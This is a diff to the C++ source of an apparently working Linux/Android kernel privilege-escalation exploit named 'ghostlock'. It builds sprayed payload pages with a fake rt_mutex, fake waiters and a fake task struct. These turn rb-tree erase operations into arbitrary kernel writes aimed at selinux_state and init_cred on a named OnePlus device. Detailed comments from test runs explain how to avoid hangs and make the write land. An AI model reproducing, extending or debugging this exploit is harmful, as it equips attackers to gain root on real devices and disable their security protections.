@@ -374,10 +374,58 @@ namespace ghostlock::support {
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
 
+            /* LOCAL DIAGNOSTIC (not for upstream): self-locating buffer.
+             * SKB_DATA_DELTA/LOCK_OFF are hardcoded upstream constants that
+             * decide where these bytes land relative to the leaked page, and
+             * measurement (run 21:27, `rz` mk=0) says they do not hold on
+             * diting. So make the buffer say where it went: in the two regions
+             * a chunk never uses, every word carries its own (chunk, offset).
+             * One probe read then decodes the real mapping instead of trusting
+             * the constant. Payload fields are written after this fill and
+             * overwrite their own offsets, so the dance sees an intact payload.
+             * Values are recognizable by their top 32 bits (0x7A5C0000|chunk).
+             * See docs/analysis/payload-page-identity-plan.md. */
+            const uint64_t chunk_tag = chunk / kernel::ORDER3_SIZE;
+            const uint64_t fill_base = 0x7A5C000000000000ULL | (chunk_tag << 32);
+            for (size_t off = 0; off < kernel::LOCK_OFF; off += sizeof(uint64_t)) {
+                put64(p, off, fill_base | off);
+            }
+            for (size_t off = 0x2000; off < kernel::ORDER3_SIZE; off += sizeof(uint64_t)) {
+                put64(p, off, fill_base | off);
+            }
+
             put32(p, kernel::LOCK_OFF + 0x00, 0);
-            put64(p, kernel::LOCK_OFF + 0x08, (session::g_exploit_session.heap.current.fake_w0));
+            /* lock->waiters.rb_root.rb_node = NULL, rb_leftmost = the page waiter.
+             *
+             * The ROOT must be empty. rt_mutex_enqueue() (rtmutex.c:684) re-links the
+             * stack waiter with an inlined `while (*link)` descent that starts at this
+             * word, and walk+0x4f4..+0x5a4 — after the dequeue's rb_erase returns and
+             * before the re-link's rb_insert_color — contains no other unbounded
+             * construct, which is exactly where run J2 (19:47) stopped: `re`+`rer`
+             * fired, then silence, no `ri` for root = fake_lock+0x08.
+             *
+             * Pointing the root at the page waiter made that descent walk into a node
+             * whose child slots are attacker data; empty, `*link` is 0, the loop exits
+             * on its first test and rb_link_node() installs the stack waiter as the
+             * root with a NULL parent, so rb_insert_color() breaks immediately on its
+             * `!parent` arm. rb_leftmost must still be a valid waiter pointer: [11]
+             * feeds rb_first_cached() into rt_mutex_dequeue_pi(), and a NULL there
+             * would dereference it. (Build G reached this state only transiently —
+             * its stack-node erase was case 1 "no children", whose __rb_change_child
+             * runs with parent == NULL and so NULLs this very word.) */
+            put64(p, kernel::LOCK_OFF + 0x08, 0);
             put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
             put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
+            /* LOCAL DIAGNOSTIC (not for upstream): inert page marker.
+             * Buffer offset LOCK_OFF + 0x80 (= 0xf00) maps to VA base + 0x80,
+             * the gap between the fake rt_mutex (base + 0x00..0x20) and the
+             * fops table (base + 0x100). Nothing in the dance reads or writes
+             * that word, so the walk cannot rewrite it: if the `rz` probe reads
+             * it back at the descent, the payload page really is the page the
+             * walk is using; if it reads foreign, the buffer never landed on
+             * `base`. Read with `mk=+0x78(%x1)` (x1 = base + 8).
+             * See docs/analysis/payload-page-identity-plan.md. */
+            put64(p, kernel::LOCK_OFF + 0x80, 0xdeadbeefcafe0000ULL | chunk_tag);
 
             if (compact) {
                 /* Words ride the erase relink: pc = value, rb_left = dest,
@@ -389,16 +437,47 @@ namespace ghostlock::support {
                 put64(p, kernel::W0_OFF + 0x00, 1); /* tree_entry.rb_parent_color */
                 put64(p, kernel::W0_OFF + 0x08, 0); /* tree_entry.rb_right */
                 put64(p, kernel::W0_OFF + 0x10, 0); /* tree_entry.rb_left */
-                (void) encode_compact_waiter(
-                    {
-                        reinterpret_cast<std::byte *>(p + kernel::W0_OFF),
-                        memory::kCompactWaiterBytes
-                    },
-                    *request, write_layout);
+                /* Page-waiter pi slot in the working CPH2521 reference's shape
+                 * {pc = target-8, right = value, left = 0} (ghostlock-oneplus
+                 * src/core/util.c:541, 558-560, 601-603). The 6.1 "left-only arm"
+                 * {value, 0, target} that encode_compact_waiter() builds for
+                 * preserve_child puts `target` — a kernel DATA address, e.g.
+                 * selinux_state — into rb_left, so every inlined `while (*link)`
+                 * descent and every rb_next() treats kernel data as an rb node.
+                 * That is unbounded on the stack waiter (fixed by zeroing it) and
+                 * on this page waiter still burned ~292 ms per walk and cost the
+                 * write (run at 19:1x: no crash, "Write 1 failed").
+                 * With left = 0 both walks stop at once and the erase still writes:
+                 * __rb_change_child() with parent = pc = target-8 stores `right`
+                 * (= the value) at *(target). The collateral store moves from
+                 * *(value+8) to *(value+0) — init_cred's refcount, which the
+                 * reference calls out as deliberate. */
+                /* Left-only arm: its store is UNCONDITIONAL —
+                 * WRITE_ONCE(rb_parent(left), pc) puts the value at *(target).
+                 * The reference's {pc = target-8, right = value, left = 0} shape
+                 * walks cleanly but stores through rb_change_child(), which only
+                 * lands on *(target) when *(target) already equals the node; for us
+                 * it went to *(target+8) and re-hung the walk (19:1x attempt 3).
+                 * `left = target` is what the descents chase, so this node must be
+                 * reached only by the erases below, never descended from. */
+                /* The pi node carries the same triple as the route's stack stamp
+                 * (waiter_tree_stamp), so whichever erase runs first performs the
+                 * same write with the same collateral. */
+                const memory::WaiterTreeStamp pi_stamp =
+                        memory::waiter_tree_stamp(write_layout);
+                put64(p, kernel::W0_OFF + 0x18, pi_stamp.pc);    /* pi pc    = value / parent */
+                put64(p, kernel::W0_OFF + 0x20, pi_stamp.right); /* pi right                  */
+                put64(p, kernel::W0_OFF + 0x28, pi_stamp.left);  /* pi left                   */
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                /* 5.10 waiter is {tree_entry, pi_tree_entry, task, lock, int prio
+                 * @0x40, u64 deadline @0x48} — there is no wake_state field (the
+                 * 6.6 shape puts wake_state at 0x40 and prio at 0x44). Writing the
+                 * 6.6 pair here left prio = 0, so `rt_mutex_top_waiter()` returned
+                 * this page waiter (prio 0 = highest) instead of the requeued stack
+                 * waiter, and the "prio > 120 gates this erase" arm never ran. */
+                put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
+                put32(p, kernel::W0_OFF + 0x44, 0); /* 5.10 padding before deadline */
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
@@ -447,7 +526,22 @@ namespace ghostlock::support {
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_pi_lock_off, 0);
-            /* Empty PI waiters avoid tree rebalancing during reinsertion. */
+            /* pi_waiters stays EMPTY (root and leftmost both NULL).
+             *
+             * Pointing them at the page waiter's pi node (build I, 19:2x) hung the
+             * walk: rt_mutex_dequeue_pi() erases that node but does NOT repoint the
+             * root — its __rb_change_child(parent = pc = value) stores into our page,
+             * not into root — so the very next rt_mutex_enqueue_pi() at [11]
+             * descends from the stale root straight into the node it just erased.
+             * The walker's prio (task->prio, ~120, written over ours at rtmutex.c:681)
+             * is less than FAKE_WAITER_PRIO (140), so the descent takes rb_left =
+             * target, and `*(target)` is the value the erase just wrote (our page
+             * address) whose own rb_right holds the collateral `target` — the chase
+             * walks out of our page into kernel .data and never returns.
+             *
+             * Empty, the enqueue links the stack waiter as the new root with no
+             * descent at all, and task_has_pi_waiters() is false in the next
+             * iteration, which ends the walk. */
             put64(p, fake_task_off + ft_pi_wait_off, 0);
             put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
             put64(p, fake_task_off + ft_tg_off, task_group);
@@ -691,11 +785,24 @@ namespace ghostlock::support {
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
         snitch.reset();
 
+        /* LOCAL DIAGNOSTIC (not for upstream): the post-payload reap burst is
+         * where every recent run dies ("payload ready" is the last line the
+         * streamer sees). Progress lines make the burst measurable: if the log
+         * stops between two of them the death is inside child i's exit, and
+         * which i tells us whether it is a fixed child or dice. */
+        pr_info("[spray] reap burst start n=%zu +%lldms\n",
+                prepare_ctx.childs.size(), ms_since(&t_spray));
         for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
             SYSCHK(close(prepare_ctx.memfds[i]));
             prepare_ctx.memfds[i] = -1;
             kill_child(prepare_ctx.childs[i]);
+            if ((i & 31) == 31) {
+                pr_info("[spray] reap %zu/%zu +%lldms\n", i + 1,
+                        prepare_ctx.childs.size(), ms_since(&t_spray));
+            }
         }
+        pr_info("[spray] reap burst done n=%zu +%lldms\n",
+                prepare_ctx.childs.size(), ms_since(&t_spray));
 
         return base;
     }
